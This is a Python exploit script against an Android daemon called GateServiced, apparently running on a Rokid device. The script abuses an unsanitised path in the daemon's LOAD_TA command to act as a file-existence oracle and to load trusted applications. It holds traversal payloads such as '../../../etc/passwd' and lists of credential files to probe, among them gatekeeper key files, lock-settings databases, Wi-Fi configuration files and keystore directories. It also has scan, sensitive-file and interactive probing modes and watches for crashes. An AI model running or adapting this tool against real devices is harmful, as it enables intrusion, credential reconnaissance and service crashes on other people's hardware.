#!/usr/bin/env python3
"""
GateServiced TA Path Traversal & File Existence Oracle
=======================================================
Exploits: Path traversal in cmd_dispatch (no path sanitization before run_load_ta)
Mechanism: Sends LOAD_TA (0x10003) with traversal paths. Differentiates responses
           to determine file existence (oracle) without reading file contents.

How it works:
  1. GateServiced reads ta_name from TCP payload (max 128 bytes)
  2. strncpy(ta_name, input, 128) — NO path validation at 0x2788
  3. run_load_ta → get_file_size(ta_name) → if 0 return 0x3001
  4. run_load_ta → read_file(ta_name, buf, size) → fopen as root
  5. File contents go to QSEE (not TCP client), but different error 
     responses reveal whether the file EXISTS and its approximate nature

Response Analysis:
  - "load ta succeed" → File exists AND is a valid signed TA (jackpot!)
  - "already loaded" → A TA is already loaded in this session
  - Error 0x3001 → File not found or size = 0
  - Error 0x300B → NULL path provided
  - Error 0x3003/0x3004 → File exists but QSEE rejected (not a valid TA)
  - Connection reset / no response → Possible crash (monitor logcat!)

Usage:
  python3 gate_traversal_oracle.py [--host=IP] [--mode=scan|dictionary|custom]
"""

import socket
import struct
import sys
import time
import json
from datetime import datetime

# ─── Config ───
HOST = "127.0.0.1"
PORT = 8341
TIMEOUT = 3

CMD_LOAD_TA   = 0x00010003
CMD_UNLOAD_TA = 0x00010004

# ─── Response Classification ───
class FileStatus:
    LOADED       = "TA_LOADED"       # File is a valid signed TA!
    ALREADY      = "ALREADY_LOADED"  # TA already loaded
    NOT_FOUND    = "NOT_FOUND"       # File doesn't exist or size=0
    EXISTS_INVAL = "EXISTS_INVALID"  # File exists but not a valid TA
    ERROR        = "ERROR"           # Other error
    CRASH        = "CRASH"           # Service crashed
    TIMEOUT      = "TIMEOUT"         # No response

def classify_response(resp):
    """Classify the response to determine file existence"""
    if resp is None:
        return FileStatus.TIMEOUT
    if len(resp) == 0:
        return FileStatus.CRASH
    
    try:
        text = resp.decode('ascii', errors='replace')
    except:
        text = ""
    
    if b"load ta succeed" in resp:
        return FileStatus.LOADED
    elif b"already loaded" in resp:
        return FileStatus.ALREADY
    
    # Binary responses — might be error codes or other data
    # Error responses from handle_client are "cmd_dispatch failed, ret:<error_hex>"
    # but actually the client just gets whatever is in the output buffer
    
    # If cmd_dispatch returns non-zero, handle_client does NOT send a response
    # (it loops back to recv). So:
    # - If we get a response → cmd_dispatch returned 0 (success)
    # - If we get no response (timeout) → cmd_dispatch returned error
    
    # For load_ta failure: cmd_dispatch returns the error code (non-zero)
    # → handle_client logs error and does NOT send response
    # → we get a timeout
    
    # But wait: the handle_client loops back and waits for next command.
    # So after a failed load, we can send another command and see if the
    # connection is still alive.
    
    # Response of exactly 0 bytes with connection still open → error path taken
    if len(resp) > 0:
        return FileStatus.EXISTS_INVAL
    
    return FileStatus.NOT_FOUND

def probe_path(path, sock=None):
    """Probe a single path via LOAD_TA"""
    close_after = sock is None
    if sock is None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        try:
            sock.connect((HOST, PORT))
        except:
            return FileStatus.CRASH, None
    
    path_bytes = path.encode('ascii') if isinstance(path, str) else path
    if not path_bytes.endswith(b"\x00"):
        path_bytes += b"\x00"
    
    if len(path_bytes) > 128:
        return FileStatus.ERROR, "path too long (>128)"
    
    frame = struct.pack("<I", CMD_LOAD_TA) + path_bytes
    
    try:
        sock.sendall(frame)
        resp = sock.recv(4096)
        status = classify_response(resp)
        
        # If we loaded a TA, unload it for next test
        if status == FileStatus.LOADED:
            time.sleep(0.1)
            sock.sendall(struct.pack("<I", CMD_UNLOAD_TA))
            try:
                sock.recv(4096)
            except:
                pass
        
        if close_after:
            sock.close()
        return status, resp
    except socket.timeout:
        # Timeout means cmd_dispatch returned error → no response sent
        # But connection should still be alive
        if close_after:
            sock.close()
        return FileStatus.NOT_FOUND, None
    except (ConnectionResetError, BrokenPipeError):
        if close_after:
            try: sock.close()
            except: pass
        return FileStatus.CRASH, None

def probe_persistent(paths):
    """Probe multiple paths on a single persistent connection.
    
    IMPORTANT: handle_client behavior on error:
    - If cmd_dispatch returns 0: sends response → recv gets data
    - If cmd_dispatch returns non-zero: logs error, does NOT send → recv times out
    - Either way, the loop continues and waits for next recvfrom
    
    Strategy: Use a persistent connection. After each LOAD_TA:
    - If we get a response within timeout → file exists
    - If timeout → file likely doesn't exist (returned error, no response sent)
    
    BUT: there's a subtlety. handle_client buffers are cleared per iteration,
    and the loop goes back to recvfrom. So after a failed LOAD, we can send
    the next command immediately.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    
    try:
        sock.connect((HOST, PORT))
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return {}
    
    results = {}
    
    for path in paths:
        path_bytes = path.encode('ascii') if isinstance(path, str) else path
        if not path_bytes.endswith(b"\x00"):
            path_bytes += b"\x00"
        
        if len(path_bytes) > 128:
            results[path] = (FileStatus.ERROR, "path too long")
            continue
        
        frame = struct.pack("<I", CMD_LOAD_TA) + path_bytes
        
        try:
            sock.sendall(frame)
            resp = sock.recv(4096)
            status = classify_response(resp)
            results[path] = (status, resp)
            
            if status == FileStatus.LOADED:
                print(f"  \033[92m★ LOADED: {path}\033[0m")
                # Unload for next test
                time.sleep(0.1)
                sock.sendall(struct.pack("<I", CMD_UNLOAD_TA))
                try: sock.recv(4096)
                except: pass
            elif status == FileStatus.EXISTS_INVAL:
                print(f"  \033[93m? EXISTS (not TA): {path}\033[0m")
            elif status == FileStatus.ALREADY:
                print(f"  \033[93m! Already loaded: {path}\033[0m")
            else:
                print(f"  \033[90m  not found: {path}\033[0m")
                
        except socket.timeout:
            # No response → cmd_dispatch returned error → likely file not found
            results[path] = (FileStatus.NOT_FOUND, None)
            print(f"  \033[90m  not found (timeout): {path}\033[0m")
            # Connection still alive, ready for next command
            
        except (ConnectionResetError, BrokenPipeError):
            results[path] = (FileStatus.CRASH, None)
            print(f"  \033[91m✗ CRASH on: {path}\033[0m")
            # Need to reconnect
            try: sock.close()
            except: pass
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT)
                sock.connect((HOST, PORT))
            except:
                print(f"  \033[91m✗ Cannot reconnect!\033[0m")
                break
        
        time.sleep(0.1)  # Small delay between probes
    
    sock.close()
    return results


# ─── Path Dictionaries ───

ANDROID_SYSTEM_PATHS = [
    "/system/build.prop",
    "/vendor/build.prop",
    "/data/system/packages.xml",
    "/proc/version",
    "/proc/cmdline",
    "/proc/cpuinfo",
    "/sys/fs/selinux/enforce",
    "/default.prop",
    "/system/etc/prop.default",
    "/dev/null",
]

QUALCOMM_TA_PATHS = [
    # Standard Qualcomm firmware mount
    "/vendor/firmware_mnt/image/cppf.mbn",
    "/vendor/firmware_mnt/image/tzhdcp.mbn",
    "/vendor/firmware_mnt/image/hdcp2p2.mbn",
    "/vendor/firmware_mnt/image/sampleauth.mbn",
    "/vendor/firmware_mnt/image/fidocrypto.mbn",
    "/vendor/firmware_mnt/image/fidocfg.mbn",
    "/vendor/firmware_mnt/image/qmiprivsys.mbn",
    "/vendor/firmware_mnt/image/chamomile.mbn",
    "/vendor/firmware_mnt/image/secotacl.mbn",
    "/vendor/firmware_mnt/image/soter.mbn",
    "/vendor/firmware_mnt/image/voiceprint.mbn",
    "/vendor/firmware_mnt/image/tz_ccm.mbn",
    "/vendor/firmware_mnt/image/tbase.mbn",
    "/vendor/firmware_mnt/image/playready.mbn",
    "/vendor/firmware_mnt/image/widevine.mbn",
    "/vendor/firmware_mnt/image/isdbtmm.mbn",
    "/vendor/firmware_mnt/image/gpqese.mbn",
    "/vendor/firmware_mnt/image/storsec.mbn",
    "/vendor/firmware_mnt/image/spdaemon.mbn",
    "/vendor/firmware_mnt/image/smpcpyap.mbn",
    "/vendor/firmware_mnt/image/macchiato.mbn",
    "/vendor/firmware_mnt/image/wvprov.mbn",
    "/vendor/firmware_mnt/image/haventoken.mbn",
    "/vendor/firmware_mnt/image/kmsvc.mbn",
    "/vendor/firmware_mnt/image/sec_img_auth.mbn",
    
    # Without firmware_mnt prefix
    "/vendor/firmware/cppf.mbn",
    "/vendor/firmware/tzhdcp.mbn",
    "/vendor/firmware/sampleauth.mbn",
    "/vendor/firmware/widevine.mbn",
    "/vendor/firmware/playready.mbn",
    "/vendor/firmware/storsec.mbn",
    
    # Alternate mount points
    "/firmware/image/cppf.mbn",
    "/firmware/image/sampleauth.mbn",
    "/firmware/image/widevine.mbn",
    
    # Some OEM put TAs here
    "/system/vendor/firmware/cppf.mbn",
    "/data/vendor/firmware/cppf.mbn",
    
    # Rokid-specific guesses
    "/vendor/etc/gate/ta.mbn",
    "/vendor/firmware/gate.mbn",
    "/system/vendor/firmware/gate_ta.mbn",
    "/vendor/firmware_mnt/image/gate.mbn",
    "/vendor/firmware_mnt/image/rokid.mbn",
    "/vendor/firmware_mnt/image/rokid_ta.mbn",
]

TRAVERSAL_PATHS = [
    # From expected working dir (likely /)
    "../../../etc/passwd",
    "../../../proc/version",
    "../../system/build.prop",
    "../../../vendor/build.prop",
    # Absolute paths with traversal prefix
    "/../../etc/passwd",
]

SENSITIVE_FILE_ORACLE = [
    # Root credentials / auth
    "/data/system/locksettings.db",
    "/data/system/gesture.key",
    "/data/system/password.key",
    "/data/system/gatekeeper.pattern.key",
    "/data/system/gatekeeper.password.key",
    "/data/misc/wifi/wpa_supplicant.conf",
    "/data/misc/wifi/WifiConfigStore.xml",
    
    # SELinux
    "/sys/fs/selinux/enforce",
    "/sepolicy",
    "/vendor/etc/selinux/",
    
    # App data probing
    "/data/data/com.rokid.uxr/shared_prefs/",
    "/data/data/com.android.shell/",
    "/data/local/tmp/",
    
    # Boot/recovery
    "/boot.img",
    "/recovery.img",
    "/dev/block/bootdevice/by-name/boot",
    "/dev/block/bootdevice/by-name/recovery",
    
    # Crypto keys
    "/data/misc/keystore/",
    "/data/misc/vold/",
]


def mode_scan():
    """Full scan mode: system paths + TA paths + traversal"""
    print("\n\033[1m[FULL SCAN MODE]\033[0m\n")
    
    all_paths = ANDROID_SYSTEM_PATHS + QUALCOMM_TA_PATHS + TRAVERSAL_PATHS
    
    print(f"Total paths to probe: {len(all_paths)}")
    print(f"Estimated time: ~{len(all_paths) * 0.3:.0f}s\n")
    
    results = probe_persistent(all_paths)
    
    # Summary
    found_ta = [p for p, (s, _) in results.items() if s == FileStatus.LOADED]
    found_exist = [p for p, (s, _) in results.items() if s == FileStatus.EXISTS_INVAL]
    not_found = [p for p, (s, _) in results.items() if s == FileStatus.NOT_FOUND]
    crashes = [p for p, (s, _) in results.items() if s == FileStatus.CRASH]
    
    print(f"\n\033[1m{'─'*60}\033[0m")
    print(f"\033[1m  ORACLE RESULTS SUMMARY\033[0m")
    print(f"{'─'*60}")
    print(f"  Probed:       {len(results)}")
    print(f"  \033[92mTA Loaded:    {len(found_ta)}\033[0m")
    print(f"  \033[93mExists (not TA): {len(found_exist)}\033[0m")
    print(f"  Not found:    {len(not_found)}")
    print(f"  \033[91mCrashes:      {len(crashes)}\033[0m")
    
    if found_ta:
        print(f"\n\033[92m  ★ LOADABLE TAs:\033[0m")
        for p in found_ta:
            print(f"    {p}")
    if found_exist:
        print(f"\n\033[93m  Files that EXIST but aren't valid TAs:\033[0m")
        for p in found_exist:
            print(f"    {p}")
    if crashes:
        print(f"\n\033[91m  CRASH-inducing paths (investigate!):\033[0m")
        for p in crashes:
            print(f"    {p}")
    
    # Save results
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outfile = f"oracle_results_{ts}.json"
    with open(outfile, "w") as f:
        json.dump({p: s for p, (s, _) in results.items()}, f, indent=2)
    print(f"\n  Results saved to: {outfile}")

def mode_dictionary():
    """Dictionary mode: focus on TA discovery"""
    print("\n\033[1m[TA DISCOVERY MODE]\033[0m\n")
    results = probe_persistent(QUALCOMM_TA_PATHS)
    
    found = [p for p, (s, _) in results.items() if s in (FileStatus.LOADED, FileStatus.EXISTS_INVAL)]
    if found:
        print(f"\n\033[92m  Found {len(found)} files:\033[0m")
        for p in found:
            print(f"    {p}")

def mode_sensitive():
    """Sensitive file oracle mode"""
    print("\n\033[1m[SENSITIVE FILE ORACLE MODE]\033[0m\n")
    results = probe_persistent(SENSITIVE_FILE_ORACLE)
    
    found = [p for p, (s, _) in results.items() if s != FileStatus.NOT_FOUND]
    if found:
        print(f"\n\033[93m  Files detected ({len(found)}):\033[0m")
        for p in found:
            status = results[p][0]
            print(f"    [{status}] {p}")

def mode_custom():
    """Interactive custom path probing"""
    print("\n\033[1m[CUSTOM PATH MODE]\033[0m")
    print("Enter paths to probe (empty line to quit):\n")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((HOST, PORT))
    
    try:
        while True:
            path = input("path> ").strip()
            if not path:
                break
            status, resp = probe_path(path, sock)
            print(f"  → {status}")
            if resp:
                print(f"  → Response: {resp[:64]!r}")
    except (EOFError, KeyboardInterrupt):
        pass
    finally:
        sock.close()

def main():
    global HOST
    
    mode = "scan"
    for arg in sys.argv[1:]:
        if arg.startswith("--host="):
            HOST = arg.split("=")[1]
        elif arg.startswith("--mode="):
            mode = arg.split("=")[1]
        elif arg == "--help":
            print("Usage: gate_traversal_oracle.py [--host=IP] [--mode=scan|dictionary|sensitive|custom]")
            return
    
    print(f"""
\033[1m\033[96m╔══════════════════════════════════════════════════════════╗
║  GateServiced Path Traversal & File Existence Oracle    ║
║  Target: TCP {HOST}:{PORT}                             ║
║  Mode: {mode:50s}║
╚══════════════════════════════════════════════════════════╝\033[0m
""")
    
    modes = {
        "scan": mode_scan,
        "dictionary": mode_dictionary,
        "sensitive": mode_sensitive,
        "custom": mode_custom,
    }
    
    if mode in modes:
        modes[mode]()
    else:
        print(f"Unknown mode: {mode}")
        print(f"Available: {', '.join(modes.keys())}")

if __name__ == "__main__":
    main()
